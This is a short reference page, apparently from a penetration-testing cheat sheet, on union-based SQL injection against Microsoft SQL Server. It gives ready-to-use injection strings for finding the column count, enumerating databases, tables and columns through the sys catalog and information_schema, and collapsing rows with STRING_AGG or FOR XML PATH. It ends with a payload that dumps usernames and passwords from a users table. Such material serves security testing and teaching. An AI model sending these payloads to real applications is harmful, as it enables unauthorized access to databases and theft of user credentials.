---
title: "Union-based SQL injection in MSSQL"
description: "Using UNION SELECT in SQL Server to extract data: detecting column count, matching types, and reading the sys catalog and information_schema."
keywords:
  - union based SQL injection
  - UNION SELECT MSSQL
  - sys.tables
  - information_schema
  - STRING_AGG
---

# Union-based

A `UNION SELECT` appends attacker-chosen rows to a returned result. SQL Server matches MySQL in spirit but is strict about types, so each injected column must match the original type or be `NULL` (which fits any type).

Detect the column count with `ORDER BY` ordinals or incremental `UNION SELECT NULL`:

```sql
' ORDER BY 3-- 
' UNION SELECT NULL,NULL,NULL-- 
```

`ORDER BY` fails past the real count, and the `NULL` list that stops raising `All queries ... must have an equal number of expressions` is the count. Replace a `NULL` with a value to find the reflected column.

Enumerate through the `sys` catalog or `information_schema`. List databases, then tables, then columns:

```sql
' UNION SELECT name,NULL,NULL FROM sys.databases-- 
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables-- 
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- 
```

Collapse many rows into one cell with `STRING_AGG()` on SQL Server 2017 and later, or the `FOR XML PATH('')` trick on older versions:

```sql
' UNION SELECT STRING_AGG(name,','),NULL,NULL FROM sys.tables-- 
' UNION SELECT (SELECT name+',' FROM sys.tables FOR XML PATH('')),NULL,NULL-- 
```

Then dump rows, concatenating with `+` and casting where needed:

```sql
' UNION SELECT STRING_AGG(username+':'+password,CHAR(10)),NULL,NULL FROM users-- 
```

There is no `LIMIT`; use `TOP n` or `OFFSET ... FETCH` when you need a single row (for example `SELECT TOP 1 name FROM sys.tables`).

## Tools

- **sqlmap**: automated union-based detection and extraction.
- **sqlcmd**: official client to confirm catalog queries directly.

## References

- Microsoft SQL Server Documentation: UNION, system catalog views, STRING_AGG, FOR XML
- OWASP Testing Guide: Testing for SQL Injection
